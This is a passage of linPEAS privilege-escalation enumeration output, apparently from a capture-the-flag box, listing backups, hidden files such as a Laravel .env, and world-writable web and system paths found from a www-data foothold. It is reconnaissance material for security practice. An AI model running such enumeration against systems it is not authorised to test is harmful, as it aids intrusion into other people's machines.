/usr/src/linux-headers-4.4.0-66-generic/include/config/net/team/mode/activebackup.h\r-rw-r--r-- 1 root root 0 Mar 3 2017 /usr/src/linux-headers-4.4.0-66-generic/include/config/wm831x/backup.h\r-rw-r--r-- 1 root root 190247 Mar 31 2017 /usr/src/linux-headers-4.4.0-72-generic/.config.old\r-rw-r--r-- 1 root root 0 Mar 31 2017 /usr/src/linux-headers-4.4.0-72-generic/include/config/net/team/mode/activebackup.h\r-rw-r--r-- 1 root root 0 Mar 31 2017 /usr/src/linux-headers-4.4.0-72-generic/include/config/wm831x/backup.h\r-rw-r--r-- 1 root root 31600 Feb 9 2017 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so\r-rw-r--r-- 1 root root 665 Apr 16 2016 /usr/share/man/man8/vgcfgbackup.8.gz\r-rw-r--r-- 1 root root 298768 Dec 29 2015 /usr/share/doc/manpages/Changes.old.gz\r-rw-r--r-- 1 root root 7867 May 6 2015 /usr/share/doc/telnet/README.telnet.old.gz\r-rwxr-xr-x 1 root root 226 Apr 14 2016 /usr/share/byobu/desktop/byobu.desktop.old\r-rw-r--r-- 1 root root 11358 Apr 9 2017 /usr/share/info/dir.old\r[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)\r[+] Web files?(output limit)\r/var/www/: total 20K\rdrwxr-xr-x 5 root root 4.0K May 10 2022 .\rdrwxr-xr-x 14 root root 4.0K May 10 2022 ..\rdrwxr-xr-x 2 www-data www-data 4.0K May 10 2022 admin\rdrwxr-xr-x 2 www-data www-data 4.0K May 5 11:07 html\rdrwxr-xr-x 13 www-data www-data 4.0K May 10 2022 laravel\r/var/www/admin:\rtotal 32K\r[+] Readable hidden interesting files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data [+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70) -rw-r--r-- 1 root root 0 May 5 04:50 /run/network/.ifstate.lock -rw-r--r-- 1 root root 1319 Apr 9 2017 /var/lib/apparmor/profiles/.apparmor.md5sums\r-rw-r--r-- 1 www-data www-data 111 Apr 9 2017 /var/www/laravel/.gitattributes\r-rw-r--r-- 1 www-data www-data 14 Apr 9 2017 /var/www/laravel/storage/app/public/.gitignore\r-rw-r--r-- 1 www-data www-data 23 Apr 9 2017 /var/www/laravel/storage/app/.gitignore\r-rw-r--r-- 1 www-data www-data 14 Apr 9 2017 /var/www/laravel/storage/framework/sessions/.gitignore\r-rw-r--r-- 1 www-data www-data 103 Apr 9 2017 /var/www/laravel/storage/framework/.gitignore\r-rw-r--r-- 1 www-data www-data 14 Apr 9 2017 /var/www/laravel/storage/framework/views/.gitignore\r-rw-r--r-- 1 www-data www-data 14 Apr 9 2017 /var/www/laravel/storage/framework/cache/.gitignore\r-rw-r--r-- 1 www-data www-data 14 Apr 9 2017 /var/www/laravel/storage/framework/testing/.gitignore\r-rw-r--r-- 1 www-data www-data 14 Apr 9 2017 /var/www/laravel/storage/logs/.gitignore\r-rw-r--r-- 1 www-data www-data 9 Apr 9 2017 /var/www/laravel/database/.gitignore\r-rw-r--r-- 1 www-data www-data 14 Apr 9 2017 /var/www/laravel/bootstrap/cache/.gitignore\r-rw-r--r-- 1 www-data www-data 553 Apr 9 2017 /var/www/laravel/public/.htaccess\r-rw-r--r-- 1 www-data www-data 117 Apr 9 2017 /var/www/laravel/.gitignore\r-rw-r--r-- 1 www-data www-data 572 Apr 9 2017 /var/www/laravel/.env\r-rw-r--r-- 1 www-data www-data 14 Feb 28 2017 /var/www/laravel/vendor/mockery/mockery/.styleci.yml\r-rw-r--r-- 1 www-data www-data 7 Feb 28 2017 /var/www/laravel/vendor/mockery/mockery/docs/.gitignore\r-rw-r--r-- 1 www-data www-data 682 Feb 28 2017 /var/www/laravel/vendor/mockery/mockery/.scrutinizer.yml\r-rw-r--r-- 1 www-data www-data 550 Feb 28 2017 /var/www/laravel/vendor/mockery/mockery/.travis.yml\r-rw-r--r-- 1 www-data www-data 137 Feb 28 2017 /var/www/laravel/vendor/mockery/mockery/.gitignore\r-rw-r--r-- 1 www-data www-data 335 Feb 28 2017 /var/www/laravel/vendor/mockery/mockery/.php_cs\r-rw-r--r-- 1 www-data www-data 368 Mar 4 2017 /var/www/laravel/vendor/sebastian/code-unit-reverse-lookup/.travis.yml\r-rw-r--r-- 1 www-data www-data 31 Mar 4 2017 /var/www/laravel/vendor/sebastian/code-unit-reverse-lookup/.gitignore\r-rw-r--r-- 1 www-data www-data 1937 Mar 4 2017 /var/www/laravel/vendor/sebastian/code-unit-reverse-lookup/.php_cs\r-rw-r--r-- 1 www-data www-data 27 Jul 28 2015 /var/www/laravel/vendor/sebastian/resource-operations/.gitignore\r-rw-r--r-- 1 www-data www-data 213 Dec 8 2015 /var/www/laravel/vendor/sebastian/diff/.travis.yml\r-rw-r--r-- 1 www-data www-data 137 Dec 8 2015 /var/www/laravel/vendor/sebastian/diff/.gitignore\r-rw-r--r-- 1 www-data www-data 1903 Dec 8 2015 /var/www/laravel/vendor/sebastian/diff/.php_cs\r-rw-r--r-- 1 www-data www-data 246 Oct 12 2015 /var/www/laravel/vendor/sebastian/global-state/.travis.yml\r-rw-r--r-- 1 www-data www-data 71 Oct 12 2015 /var/www/laravel/vendor/sebastian/global-state/.gitignore\r-rw-r--r-- 1 www-data www-data 350 Nov 19 2016 /var/www/laravel/vendor/sebastian/exporter/.travis.yml\r-rw-r--r-- 1 www-data www-data 113 Nov 19 2016 /var/www/laravel/vendor/sebastian/exporter/.gitignore\r-rw-r--r-- 1 www-data www-data 406 Jan 29 2017 /var/www/laravel/vendor/sebastian/comparator/.travis.yml\r-rw-r--r-- 1 www-data www-data 74 Jan 29 2017 /var/www/laravel/vendor/sebastian/comparator/.gitignore\r-rw-r--r-- 1 www-data www-data 15 Oct 3 2016 /var/www/laravel/vendor/sebastian/version/.gitattributes\r-rw-r--r-- 1 www-data www-data 7 Oct 3 2016 /var/www/laravel/vendor/sebastian/version/.gitignore\r-rw-r--r-- 1 www-data www-data 1919 Oct 3 2016 /var/www/laravel/vendor/sebastian/version/.php_cs\r-rw-r--r-- 1 www-data www-data 200 Nov 26 2016 /var/www/laravel/vendor/sebastian/environment/.travis.yml\r-rw-r--r-- 1 www-data www-data 45 Nov 26 2016 /var/www/laravel/vendor/sebastian/environment/.gitignore\r-rw-r--r-- 1 www-data www-data 280 Nov 19 2016 /var/www/laravel/vendor/sebastian/recursion-context/.travis.yml\r-rw-r--r-- 1 www-data www-data 113 Nov 19 2016 /var/www/laravel/vendor/sebastian/recursion-context/.gitignore\r-rw-r--r-- 1 www-data www-data 337 Feb 18 2017 /var/www/laravel/vendor/sebastian/object-enumerator/.travis.yml\r-rw-r--r-- 1 www-data www-data 101 Feb 18 2017 /var/www/laravel/vendor/sebastian/object-enumerator/.gitignore\r-rw-r--r-- 1 www-data www-data 1937 Feb 18 2017 /var/www/laravel/vendor/sebastian/object-enumerator/.php_cs\r-rw-r--r-- 1 www-data www-data 640 Mar 5 2017 /var/www/laravel/vendor/nikic/php-parser/.travis.yml\r-rw-r--r-- 1 www-data www-data 58 Mar 5 2017 /var/www/laravel/vendor/nikic/php-parser/.gitignore\r-rw-r--r-- 1 www-data www-data 18 May 11 2015 /var/www/laravel/vendor/hamcrest/hamcrest-php/.coveralls.yml\r-rw-r--r-- 1 www-data www-data 184 May 11 2015 /var/www/laravel/vendor/hamcrest/hamcrest-php/.gush.yml\r-rw-r--r-- 1 www-data www-data 358 May 11 2015 /var/www/laravel/vendor/hamcrest/hamcrest-php/.travis.yml\r-rw-r--r-- 1 www-data www-data 21 May 11 2015 /var/www/laravel/vendor/hamcrest/hamcrest-php/.gitignore\r-rw-r--r-- 1 www-data www-data 1624 Jan 16 2017 /var/www/laravel/vendor/nesbot/carbon/.php_cs.dist\r-rw-r--r-- 1 www-data www-data 0 Mar 13 2017 /var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/Fixtures/.gitkeep\r-rw-r--r-- 1 www-data www-data 1868 Mar 13 2017 /var/www/laravel/vendor/monolog/monolog/.php_cs\r-rw-r--r-- 1 www-data www-data 293 Apr 29 2016 /var/www/laravel/vendor/fzaninotto/faker/.travis.yml\r-rw-r--r-- 1 www-data www-data 21 Apr 29 2016 /var/www/laravel/vendor/fzaninotto/faker/.gitignore\r-rw-r--r-- 1 www-data www-data 201 Apr 8 2014 /var/www/laravel/vendor/jakub-onderka/php-console-color/.travis.yml\r-rw-r--r-- 1 www-data www-data 27 Apr 8 2014 /var/www/laravel/vendor/jakub-onderka/php-console-color/.gitignore\r-rw-r--r-- 1 www-data www-data 242 Apr 20 2015 /var/www/laravel/vendor/jakub-onderka/php-console-highlighter/.travis.yml\r-rw-r--r-- 1 www-data www-data 39 Apr 20 2015 /var/www/laravel/vendor/jakub-onderka/php-console-highlighter/.gitignore\r-rw-r--r-- 1 www-data www-data 157 Feb 13 2017 /var/www/laravel/vendor/swiftmailer/swiftmailer/.gitattributes\r-rw-r--r-- 1 www-data www-data 589 Feb 13 2017 /var/www/laravel/vendor/swiftmailer/swiftmailer/.travis.yml\r-rw-r--r-- 1 www-data www-data 120 Feb 13 2017 /var/www/laravel/vendor/swiftmailer/swiftmailer/.gitignore\r-rw-r--r-- 1 www-data www-data 484 Feb 13 2017 /var/www/laravel/vendor/swiftmailer/swiftmailer/.php_cs.dist\r-rw-r--r-- 1 www-data www-data 7 Oct 10 2016 /var/www/laravel/vendor/psr/log/.gitignore\r-rw-r--r-- 1 www-data www-data 165 Mar 29 2017 /var/www/laravel/vendor/erusev/parsedown/.travis.yml\r-rwxr-xr-x 1 www-data www-data 136 Jan 27 2017 /var/www/laravel/vendor/myclabs/deep-copy/.gitattributes\r-rwxr-xr-x 1 www-data www-data 723 Jan 27 2017 /var/www/laravel/vendor/myclabs/deep-copy/.travis.yml\r-rwxr-xr-x 1 www-data www-data 56 Jan 27 2017 /var/www/laravel/vendor/myclabs/deep-copy/.gitignore\r-rw-r--r-- 1 www-data www-data 1169 Jun 15 2015 /var/www/laravel/vendor/doctrine/instantiator/.scrutinizer.yml\rgrep: write error: Broken pipe\r[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70) -rw-r--r-- 1 root root 43 Mar 22 2017 /var/backups/dpkg.arch.1.gz -rw-r--r-- 1 root root 2152 Mar 23 2017 /var/backups/alternatives.tar.1.gz\r-rw-r--r-- 1 root root 202 Mar 22 2017 /var/backups/dpkg.diversions.1.gz\r-rw-r--r-- 1 root root 143460 Mar 22 2017 /var/backups/dpkg.status.1.gz\r-rw-r--r-- 1 root root 171 Mar 22 2017 /var/backups/dpkg.statoverride.1.gz\r-rw-r--r-- 1 root root 526336 May 10 2022 /var/backups/dpkg.status.0\r-rw-r--r-- 1 root root 207 Mar 22 2017 /var/backups/dpkg.statoverride.0\r-rw-r--r-- 1 root root 11 Mar 22 2017 /var/backups/dpkg.arch.0\r-rw-r--r-- 1 root root 746 Mar 22 2017 /var/backups/apt.extended_states.1.gz\r-rw-r--r-- 1 root root 40960 May 5 06:25 /var/backups/alternatives.tar.0\r-rw-r--r-- 1 root root 7117 Apr 9 2017 /var/backups/apt.extended_states.0\r-rw-r--r-- 1 root root 437 Mar 22 2017 /var/backups/dpkg.diversions.0\r[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files uniq: write error: Broken pipe /dev/mqueue\r/dev/shm\r/run/lock\r/run/lock/apache2\r/run/screen/S-www-data\r/tmp\r/tmp/.ICE-unix\r/tmp/.Test-unix\r/tmp/.X11-unix\r/tmp/.XIM-unix\r/tmp/.font-unix\r#)You_can_write_even_more_files_inside_last_directory\r/var/cache/apache2/mod_cache_disk\r/var/crash\r/var/lib/lxcfs/cgroup/memory/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/bind9.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/dev-cronosx2dvg-swap_1.swap/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-dmx2dnamex2dcronosx2dx2dvgx2dswap_1.swap/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-dmx2duuidx2dLVMx2dugG31L7SgY5Eq7gNrbTJm4cB1GDM01JlrG31I4305630g1F9wbsXioYxpf3XSPmJ.swap/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2duuid-8562ccf5x2d6b15x2d4c8cx2d965ax2dfaf52bf455a6.swap/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/dev-dmx2d1.swap/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/dev-mapper-cronosx2dx2dvgx2dswap_1.swap/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/ifup@ens160.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/system-systemdx2dfsck.slice/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control\r/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control\r/var/lib/php/sessions\r/var/tmp\r/var/www/admin\r/var/www/admin/.welcome.php.swp\r/var/www/admin/config.php\r/var/www/admin/index.php\r/var/www/admin/logout.php\r/var/www/admin/session.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/html\r/var/www/html/1.txt\r/var/www/html/index.html\r/var/www/html/linpeas.sh\r/var/www/laravel\r/var/www/laravel/.env\r/var/www/laravel/.git\r/var/www/laravel/.git/HEAD\r/var/www/laravel/.git/branches\r/var/www/laravel/.git/config\r/var/www/laravel/.git/description\r/var/www/laravel/.git/hooks\r/var/www/laravel/.git/hooks/applypatch-msg.sample\r/var/www/laravel/.git/hooks/commit-msg.sample\r/var/www/laravel/.git/hooks/post-update.sample\r/var/www/laravel/.git/hooks/pre-applypatch.sample\r/var/www/laravel/.git/hooks/pre-commit.sample\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/.git/index\r/var/www/laravel/.git/info\r/var/www/laravel/.git/info/exclude\r/var/www/laravel/.git/logs\r/var/www/laravel/.git/logs/HEAD\r/var/www/laravel/.git/logs/refs\r/var/www/laravel/.git/logs/refs/heads\r/var/www/laravel/.git/logs/refs/heads/master\r/var/www/laravel/.git/logs/refs/remotes\r/var/www/laravel/.git/logs/refs/remotes/origin\r/var/www/laravel/.git/logs/refs/remotes/origin/HEAD\r/var/www/laravel/.git/objects\r/var/www/laravel/.git/objects/info\r/var/www/laravel/.git/objects/pack\r/var/www/laravel/.git/objects/pack/pack-74fa3b6d97d942c652cea224987f7c73a85e058c.idx\r/var/www/laravel/.git/objects/pack/pack-74fa3b6d97d942c652cea224987f7c73a85e058c.pack\r/var/www/laravel/.git/packed-refs\r/var/www/laravel/.git/refs\r/var/www/laravel/.git/refs/heads\r/var/www/laravel/.git/refs/heads/master\r/var/www/laravel/.git/refs/remotes\r/var/www/laravel/.git/refs/remotes/origin\r/var/www/laravel/.git/refs/remotes/origin/HEAD\r/var/www/laravel/.git/refs/tags\r/var/www/laravel/.gitattributes\r/var/www/laravel/.gitignore\r/var/www/laravel/CHANGELOG.md\r/var/www/laravel/app\r/var/www/laravel/app/Console\r/var/www/laravel/app/Console/Kernel.php\r/var/www/laravel/app/Exceptions\r/var/www/laravel/app/Exceptions/Handler.php\r/var/www/laravel/app/Http\r/var/www/laravel/app/Http/Controllers\r/var/www/laravel/app/Http/Controllers/Auth\r/var/www/laravel/app/Http/Controllers/Auth/ForgotPasswordController.php\r/var/www/laravel/app/Http/Controllers/Auth/LoginController.php\r/var/www/laravel/app/Http/Controllers/Auth/RegisterController.php\r/var/www/laravel/app/Http/Controllers/Auth/ResetPasswordController.php\r/var/www/laravel/app/Http/Controllers/Controller.php\r/var/www/laravel/app/Http/Kernel.php\r/var/www/laravel/app/Http/Middleware\r/var/www/laravel/app/Http/Middleware/EncryptCookies.php\r/var/www/laravel/app/Http/Middleware/RedirectIfAuthenticated.php\r/var/www/laravel/app/Http/Middleware/TrimStrings.php\r/var/www/laravel/app/Http/Middleware/VerifyCsrfToken.php\r/var/www/laravel/app/Providers\r/var/www/laravel/app/Providers/AppServiceProvider.php\r/var/www/laravel/app/Providers/AuthServiceProvider.php\r/var/www/laravel/app/Providers/BroadcastServiceProvider.php\r/var/www/laravel/app/Providers/EventServiceProvider.php\r/var/www/laravel/app/Providers/RouteServiceProvider.php\r/var/www/laravel/app/User.php\r/var/www/laravel/artisan\r/var/www/laravel/bootstrap\r/var/www/laravel/bootstrap/app.php\r/var/www/laravel/bootstrap/autoload.php\r/var/www/laravel/bootstrap/cache\r/var/www/laravel/bootstrap/cache/.gitignore\r/var/www/laravel/bootstrap/cache/services.php\r/var/www/laravel/composer.json\r/var/www/laravel/composer.lock\r/var/www/laravel/composer.phar\r/var/www/laravel/config\r/var/www/laravel/config/app.php\r/var/www/laravel/config/auth.php\r/var/www/laravel/config/broadcasting.php\r/var/www/laravel/config/cache.php\r/var/www/laravel/config/database.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/database\r/var/www/laravel/database/.gitignore\r/var/www/laravel/database/factories\r/var/www/laravel/database/factories/ModelFactory.php\r/var/www/laravel/database/migrations\r/var/www/laravel/database/migrations/2014_10_12_000000_create_users_table.php\r/var/www/laravel/database/migrations/2014_10_12_100000_create_password_resets_table.php\r/var/www/laravel/database/seeds\r/var/www/laravel/database/seeds/DatabaseSeeder.php\r/var/www/laravel/package.json\r/var/www/laravel/phpunit.xml\r/var/www/laravel/public\r/var/www/laravel/public/.htaccess\r/var/www/laravel/public/css\r/var/www/laravel/public/css/app.css\r/var/www/laravel/public/favicon.ico\r/var/www/laravel/public/index.php\r/var/www/laravel/public/js\r/var/www/laravel/public/js/app.js\r/var/www/laravel/public/robots.txt\r/var/www/laravel/public/web.config\r/var/www/laravel/readme.md\r/var/www/laravel/resources\r/var/www/laravel/resources/assets\r/var/www/laravel/resources/assets/js\r/var/www/laravel/resources/assets/js/app.js\r/var/www/laravel/resources/assets/js/bootstrap.js\r/var/www/laravel/resources/assets/js/components\r/var/www/laravel/resources/assets/js/components/Example.vue\r/var/www/laravel/resources/assets/sass\r/var/www/laravel/resources/assets/sass/_variables.scss\r/var/www/laravel/resources/assets/sass/app.scss\r/var/www/laravel/resources/lang\r/var/www/laravel/resources/lang/en\r/var/www/laravel/resources/lang/en/auth.php\r/var/www/laravel/resources/lang/en/pagination.php\r/var/www/laravel/resources/lang/en/passwords.php\r/var/www/laravel/resources/lang/en/validation.php\r/var/www/laravel/resources/views\r/var/www/laravel/resources/views/welcome.blade.php\r/var/www/laravel/routes\r/var/www/laravel/routes/api.php\r/var/www/laravel/routes/channels.php\r/var/www/laravel/routes/console.php\r/var/www/laravel/routes/web.php\r/var/www/laravel/server.php\r/var/www/laravel/storage\r/var/www/laravel/storage/app\r/var/www/laravel/storage/app/.gitignore\r/var/www/laravel/storage/app/public\r/var/www/laravel/storage/app/public/.gitignore\r/var/www/laravel/storage/framework\r/var/www/laravel/storage/framework/.gitignore\r/var/www/laravel/storage/framework/cache\r/var/www/laravel/storage/framework/cache/.gitignore\r/var/www/laravel/storage/framework/sessions\r/var/www/laravel/storage/framework/sessions/.gitignore\r/var/www/laravel/storage/framework/sessions/1Sv4Jq7mcz2rCJLnHoni6cCFwYmc1nwdnsqsY51x\r/var/www/laravel/storage/framework/sessions/FN3lutVJT43d3HK689A2l0qvJBtsf2xjj0eSmqso\r/var/www/laravel/storage/framework/sessions/WFJ8pBfiayyMMH2S5jzH7JODl27e5oS6OFxzHT0a\r/var/www/laravel/storage/framework/sessions/fXZR31RDYlHbTVRXq5fyPzhyASazJV1WLu3yrv9d\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/storage/framework/testing\r/var/www/laravel/storage/framework/testing/.gitignore\r/var/www/laravel/storage/framework/views\r/var/www/laravel/storage/framework/views/.gitignore\r/var/www/laravel/storage/framework/views/24f4512b760336fe6f663d547ab4b08077451f92.php\r/var/www/laravel/storage/logs\r/var/www/laravel/storage/logs/.gitignore\r/var/www/laravel/tests\r/var/www/laravel/tests/CreatesApplication.php\r/var/www/laravel/tests/Feature\r/var/www/laravel/tests/Feature/ExampleTest.php\r/var/www/laravel/tests/TestCase.php\r/var/www/laravel/tests/Unit\r/var/www/laravel/tests/Unit/ExampleTest.php\r/var/www/laravel/vendor\r/var/www/laravel/vendor/autoload.php\r/var/www/laravel/vendor/bin\r/var/www/laravel/vendor/composer\r/var/www/laravel/vendor/composer/ClassLoader.php\r/var/www/laravel/vendor/composer/LICENSE\r/var/www/laravel/vendor/composer/autoload_classmap.php\r/var/www/laravel/vendor/composer/autoload_files.php\r/var/www/laravel/vendor/composer/autoload_namespaces.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/dnoegel\r/var/www/laravel/vendor/dnoegel/php-xdg-base-dir\r/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/.gitignore\r/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/LICENSE\r/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/README.md\r/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/composer.json\r/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/phpunit.xml.dist\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/src/Xdg.php\r/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/tests\r/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/tests/XdgTest.php\r/var/www/laravel/vendor/doctrine\r/var/www/laravel/vendor/doctrine/inflector\r/var/www/laravel/vendor/doctrine/inflector/.gitignore\r/var/www/laravel/vendor/doctrine/inflector/.travis.yml\r/var/www/laravel/vendor/doctrine/inflector/LICENSE\r/var/www/laravel/vendor/doctrine/inflector/README.md\r/var/www/laravel/vendor/doctrine/inflector/composer.json\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/doctrine/inflector/lib/Doctrine\r/var/www/laravel/vendor/doctrine/inflector/lib/Doctrine/Common\r/var/www/laravel/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector\r/var/www/laravel/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector/Inflector.php\r/var/www/laravel/vendor/doctrine/inflector/phpunit.xml.dist\r/var/www/laravel/vendor/doctrine/inflector/tests\r/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine\r/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests\r/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/Common\r/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/Common/Inflector\r/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/Common/Inflector/InflectorTest.php\r/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/DoctrineTestCase.php\r/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/TestInit.php\r/var/www/laravel/vendor/doctrine/instantiator\r/var/www/laravel/vendor/doctrine/instantiator/.gitignore\r/var/www/laravel/vendor/doctrine/instantiator/.scrutinizer.yml\r/var/www/laravel/vendor/doctrine/instantiator/.travis.install.sh\r/var/www/laravel/vendor/doctrine/instantiator/.travis.yml\r/var/www/laravel/vendor/doctrine/instantiator/CONTRIBUTING.md\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine\r/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator\r/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Exception\r/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Exception/ExceptionInterface.php\r/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Exception/InvalidArgumentException.php\r/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Exception/UnexpectedValueException.php\r/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Instantiator.php\r/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/InstantiatorInterface.php\r/var/www/laravel/vendor/doctrine/instantiator/tests\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorPerformance\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorPerformance/InstantiatorPerformanceEvent.php\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest/Exception\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest/Exception/InvalidArgumentExceptionTest.php\r/var/www/laravel/vendor/doctrine/instantiator/tests/